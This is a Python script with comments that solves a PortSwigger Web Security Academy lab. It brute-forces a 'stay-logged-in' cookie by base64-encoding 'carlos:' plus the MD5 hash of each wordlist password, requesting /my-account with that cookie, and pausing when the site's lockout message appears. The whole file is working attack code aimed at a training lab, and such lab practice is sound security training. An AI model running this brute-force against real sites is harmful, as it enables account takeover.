# A simple python program made to solve the following lab:
# https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie

# Log into the program with the credentials wiener:peter and select the remember me option
# Look at the cookie named stay-logged-in:
# d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
# Decoding this cookie value from base 64 reveals the following:
# wiener:51dc30ddc473d43a6011e9ebba6ca770
# Hashing the password peter with the MD5 algorithm reveals the following:
# 51dc30ddc473d43a6011e9ebba6ca770

# Basic Program Logic:
# Iterate through every password
# Take current password and get it's MD5 hash
# Append hashed password to "carlos:".
# Take the string created from the previous step and encode it with Base 64.
# Use the Base 64 encoded string from the previous step and use this is the value to the "stay-logged-in" cookie name.
# Send a get request to /my-account with the cookie that was just created.
# If a 200 status code is returned, the password for carlos has been found.
# Else, try next password.

import requests
import hashlib
import base64
import time
import sys

SCHEME = "https://"
URL = "web-security-academy.net"
PATH = "/my-account"
SUB_DOMAIN = "" # Change This Line With Labs Subdomain
FULL_PATH = SCHEME + SUB_DOMAIN + "." + URL + PATH
PASSWORD_FILE = "../../Word-Lists/password-wordlist.txt"
TARGET_USERNAME = "carlos"
COOKIE_PARAM = "stay-logged-in"
ERROR_MESSAGE = "Please try again in 1 minute(s)."
SUCCESS_STATUS = 200

def load_file_lines(file_name):
    try:
        print(f"Loading {file_name}...")
        array = []
        with open(file_name, 'r') as file:
            for line in file:
                array.append(line.strip())
        return array
    except FileNotFoundError:
        print(f"Error: File '{file_name}' not found.")
    return None

def convert_to_hash(string):
    UTF_8_STRING = string.encode('UTF-8')
    MD5_OBJECT = hashlib.md5(UTF_8_STRING)
    STRING_HASH = MD5_OBJECT.hexdigest()
    return STRING_HASH

def convert_to_base_64(hashed_password):
    BYTES = base64.b64encode(bytes(f"{TARGET_USERNAME}:{hashed_password}", "utf-8"))
    BASE_64_STRING = BYTES.decode('utf-8')
    return BASE_64_STRING


def send_get_request(cookie_value):
    HEADERS = {"Cookie" : COOKIE_PARAM + "=" + cookie_value}
    response = requests.get(FULL_PATH, headers = HEADERS, allow_redirects = False)
    HTML = response.text
    if ERROR_MESSAGE in HTML:
        time.sleep(60)
        response = requests.get(FULL_PATH, headers = HEADERS, allow_redirects = False)
    return response


def find_password(passwords):
    for password in passwords:
        password_md5 = convert_to_hash(password)
        base_64_cookie = convert_to_base_64(password_md5)
        response = send_get_request(base_64_cookie)
        status = response.status_code
        print(f"{password} --> {password_md5} --> {base_64_cookie} --> {status}\n")
        if status == SUCCESS_STATUS:
            print(f"Possible match with cookie value: {base_64_cookie}")
            return password
    return None

def main():
    print(f"Program Starting... Target URL: {FULL_PATH}")
    PASSWORDS = load_file_lines(PASSWORD_FILE)
    if PASSWORDS is None:
        sys.exit(1)
    PASSWORD = find_password(PASSWORDS)
    if PASSWORD is None:
        print(f"Password was not found.")
        sys.exit(1)
    print(f"Possible password found... {TARGET_USERNAME}:{PASSWORD}")
    return 0

if __name__ == "__main__":
    main()
